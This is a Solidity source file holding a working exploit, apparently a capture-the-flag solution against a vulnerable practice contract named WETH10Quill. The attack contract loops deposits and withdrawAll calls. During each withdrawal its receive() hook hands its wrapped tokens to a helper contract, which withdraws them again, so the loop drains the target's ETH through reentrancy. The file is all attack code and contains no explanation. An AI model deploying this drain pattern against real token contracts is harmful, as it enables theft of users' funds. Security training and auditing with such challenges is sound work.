// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./WETH10.sol";
import "hardhat/console.sol";

contract WETH10QuillAttackHelper {
    function get(address _weth) public {
        WETH10Quill weth = WETH10Quill(payable(_weth));
        weth.withdrawAll();
        (bool success, ) = address(msg.sender).call{value: address(this).balance}("");
        require(success);    
    }

    receive() external payable {}
}

contract WETH10QuillAttack {
    WETH10Quill public weth;    
    WETH10QuillAttackHelper public helper;
    function attack(address payable target) public payable {
        weth = WETH10Quill(target);
        helper = new WETH10QuillAttackHelper();

        while(address(weth).balance != 0) {
            uint256 v = address(this).balance <= address(weth).balance ? address(this).balance : address(weth).balance;
            weth.deposit{value: v}();
            weth.withdrawAll();
            helper.get(address(weth));
            // this.balance += deposit value, 
        }
    }

    receive() external payable {
        weth.transfer(address(helper), weth.balanceOf(address(this)));
    }
}
